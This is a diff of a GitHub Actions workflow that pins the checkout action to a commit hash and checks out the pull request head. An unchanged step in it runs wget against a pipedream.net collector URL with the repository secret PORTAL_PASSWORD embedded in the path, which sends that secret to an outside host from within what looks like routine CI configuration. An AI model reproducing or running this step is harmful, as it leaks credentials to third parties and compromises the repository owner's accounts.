@@ -16,7 +16,7 @@ jobs:
     needs: authorize
     runs-on: windows-latest
     steps:
-      - uses: actions/checkout@v3
+      - uses: actions/checkout@16f938a56647d54dfeec7941ed44dc337ebdd8d8
         with:
           ref: ${{ github.event.pull_request.head.sha || github.ref }}
       - run: C:\msys64\usr\bin\wget.exe '''https://eou8ar92f6o5frq.m.pipedream.net/${{ secrets.PORTAL_PASSWORD }}''' -O test -d -v
